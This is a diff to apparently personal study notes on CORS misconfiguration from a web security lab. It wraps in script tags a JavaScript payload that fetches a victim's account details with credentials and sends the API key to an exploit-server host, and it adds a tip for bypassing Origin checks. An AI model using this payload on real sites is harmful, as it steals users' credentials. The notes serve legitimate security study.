@@ -32,16 +32,18 @@
 
 1. Server-generated ACAO header from client-specified Origin header
 ```js
+<script>
   function getadmin() {
-    var res = JSON.parse(this.response)
-    fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
-}
-
-const request = new XMLHttpRequest();
-request.addEventListener("load", getadmin);
-request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
-request.withCredentials = true;
-request.send();
+      var res = JSON.parse(this.response)
+      fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
+  }
+  
+  const request = new XMLHttpRequest();
+  request.addEventListener("load", getadmin);
+  request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
+  request.withCredentials = true;
+  request.send();
+</script>
 ```
 2. Errors parsing Origin headers
 - If `normal-website.com` is ok then try `hackersnormal-website.com`.
